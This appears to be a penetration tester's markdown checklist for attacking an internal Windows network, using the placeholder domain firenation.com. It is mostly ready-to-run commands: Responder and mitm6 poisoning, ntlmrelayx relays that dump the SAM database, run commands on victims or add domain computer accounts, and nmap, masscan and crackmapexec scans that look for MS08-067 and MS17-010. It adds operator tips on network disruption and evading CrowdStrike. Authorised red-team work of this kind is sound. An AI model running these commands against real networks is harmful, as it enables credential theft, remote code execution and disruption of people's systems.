# LAN Attacks & Scanning

## LAN Attacks
 - [ ] Begin running [Responder](https://github.com/SpiderLabs/Responder):
    ```
    apt update && apt install -y responder
    responder -I eth0 -wrf
    ```
 - [ ] Run [mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/):
    ```
    pip install mitm6
    mitm6 -i eth0 -d firenation.com --debug 
    ```
    *Note: Every time I've run this, it has caused network disruptions. Proceed with caution and check out params `-hw` and `-hb`*
    
 - [ ] Relay NTLM authentication from the above poisoning (this specifically is for `mitm6`)
    ```
    ## Should relay to victim via SMB. Needs local admin (I think maybe RID500...need to verify)
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -of net-ntlmv2.hsh                   # Attempt to dump SAM 
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -of net-ntlmv2.hsh -c "systeminfo"   # Runs "systeminfo". Caught by CrowdStrike.

    ## LDAPS NTLM relay (patches may fix this!). Any Domain User can add up to 10 computers by default. Compy can be used for BloodHound.
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -t ldaps://dc.firenation.com --add-computer
    ##
    ```
 - [ ] If you get hashes, go to [Password Cracking]() checklist
 - [ ] If you crack hashes or get access to network creds, go to [Lateral Movement & Domain PrivEsc]()

## Network Scanning
 - [ ] Kick off a big top 1024 scan. Don't forget to log it in case the scans hang up. Increase to `-T5` if you're feeling adventurous:
   ```
   mkdir scans
   nmap -iL subnets-firenation.lst -sV -sC -T4 -oA firenation-sV-sC -v | tee scans/nmap.log
   ```
 - [ ] Kick off a Nessus or other vuln scan
 - [ ] Find DNS servers if needed: `masscan -iL subnets-firenation.lst -p53 -oG dns-open`
 - [ ] Perform reverse DNS lookups on the domain: `nmap -iL subnets-firenation.lst -sL -oA dns-lookup`
 - [ ] Scan for SMB and for SMB Signing: `crackmapexec smb subnets-firenation.lst | tee scans/cme-smb-scan.log`
 - [ ] Get list of SMB open and scan for top MS vulns: `nmap -iL firenation-smb.lst -p445 --script=smb-vuln-ms08-067,smb-vuln-ms17-010 -v | tee scans/nmap-smb-vulns.log`
